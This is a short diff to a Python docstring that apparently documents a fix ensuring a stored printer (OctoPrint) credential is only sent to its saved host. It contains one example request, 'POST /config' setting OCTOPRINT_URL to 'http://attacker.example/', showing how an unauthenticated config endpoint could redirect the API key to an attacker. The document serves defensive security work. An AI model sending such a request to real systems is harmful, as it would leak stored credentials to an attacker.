@@ -1,6 +1,6 @@
 """A stored printer credential goes to the host it was saved for, and nowhere else.
 
-`POST /config` has no authentication in front of it, and it writes both halves of an
+`POST /config` had no authentication in front of it, and it writes both halves of an
 authenticated outbound request: the address and the key. So
 
     POST /config {"key": "OCTOPRINT_URL", "value": "http://attacker.example/"}
